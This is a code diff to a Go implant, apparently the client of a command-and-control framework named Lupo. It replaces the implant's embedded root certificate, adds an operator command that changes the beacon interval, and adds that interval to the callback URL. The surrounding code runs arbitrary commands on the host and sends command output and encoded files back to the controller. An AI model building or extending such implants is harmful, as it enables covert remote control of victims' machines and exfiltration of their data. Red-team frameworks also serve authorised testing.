@@ -34,19 +34,19 @@ type lupoImplant struct {
 var implant *lupoImplant
 
 var rootCert string = `-----BEGIN CERTIFICATE-----
-MIICaDCCAe6gAwIBAgIUYLDpgVk6sWoVs8YncVZb1fyia48wCgYIKoZIzj0EAwIw
+MIICaTCCAe6gAwIBAgIUKfmymT17yUxMTaCSiw/oW9NVW4IwCgYIKoZIzj0EAwIw
 XTELMAkGA1UEBhMCVVMxDTALBgNVBAgMBEx1cG8xDTALBgNVBAcMBEx1cG8xDTAL
 BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xEjAQBgNVBAMMCTEyNy4wLjAuMTAe
-Fw0yMjExMDQxODI1NDVaFw0zMjExMDExODI1NDVaMF0xCzAJBgNVBAYTAlVTMQ0w
+Fw0yMjEyMTkxOTMzMTFaFw0zMjEyMTYxOTMzMTFaMF0xCzAJBgNVBAYTAlVTMQ0w
 CwYDVQQIDARMdXBvMQ0wCwYDVQQHDARMdXBvMQ0wCwYDVQQKDARMdXBvMQ0wCwYD
 VQQLDARMdXBvMRIwEAYDVQQDDAkxMjcuMC4wLjEwdjAQBgcqhkjOPQIBBgUrgQQA
-IgNiAARByJuNeJHhznNJKGCnP4qfDdf2rBRpn9HMAgik1OuFY7DmcSqom52lqZa+
-SX6VZmgl+VvzaxKe6hZkpYlxPXxCIE5iNBSn0nox6mPJwIchUph2NA78MVh7h1fn
-6YWj562jbzBtMB0GA1UdDgQWBBQcYBUg4If+4KCWvwTAua9L1TuaxTAfBgNVHSME
-GDAWgBQcYBUg4If+4KCWvwTAua9L1TuaxTAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
-EQQTMBGCCTEyNy4wLjAuMYcEfwAAATAKBggqhkjOPQQDAgNoADBlAjEAiZhS4ek6
-XYNuX0v2bLC10tXwD/U/JAAj/s+ksHfS6Pe7KMSMeDmtaHzPQLGcPEAxAjBY4qv9
-Fb/3Nn0/dl3V11rvAExZ10P2PsuceIwFUu/ICj60OLhC9aTuw+jp9EbkGC0=
+IgNiAATW8S3Irhx/h7cHAhoTjn2irThu7UpXbaS17jOYRtL6g564GVXG0QLGuRfW
+GamAlMKbFscHOFni3zTN71p5Tk+tbKCNhlk1WVfLoIuBBfy//evfUIPbtYmC4dnA
+ShAoAy2jbzBtMB0GA1UdDgQWBBQN8HZXeJBIsIGWbMKvqfN2sKV9HzAfBgNVHSME
+GDAWgBQN8HZXeJBIsIGWbMKvqfN2sKV9HzAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
+EQQTMBGCCTEyNy4wLjAuMYcEfwAAATAKBggqhkjOPQQDAgNpADBmAjEAucrRQ8fB
+0cqYmev4gAalTUDQbnj5a61XN5s/lA2N+UklPZcib+K3Ekx6HFNEr/g/AjEA2fm7
+mayCI7NeNwbGgd71ufRDxGGoux7OS206gORLDexDJNhWb0I+vQP1tN/zciDs
 -----END CERTIFICATE-----
 `
 
@@ -246,6 +246,12 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 					fileString = "&filename=" + url.QueryEscape(filename) + "&file=" + url.QueryEscape(encoded)
 
+				} else if cmd == "updateinterval" {
+					implant.updateInterval, err = strconv.Atoi(argS[0])
+					if err != nil {
+						return
+					}
+					dataString = "Implant interval updated to: " + strconv.Itoa(implant.updateInterval)
 				} else {
 					data, err = exec.Command(cmd, argS...).Output()
 				}
@@ -267,7 +273,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			}
 
 			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
-			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + dataString + fileString
+			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&user=" + operator + dataString + fileString
 			requestUrl = connectionString + requestParams
 
 			resp, err = client.Get(requestUrl)
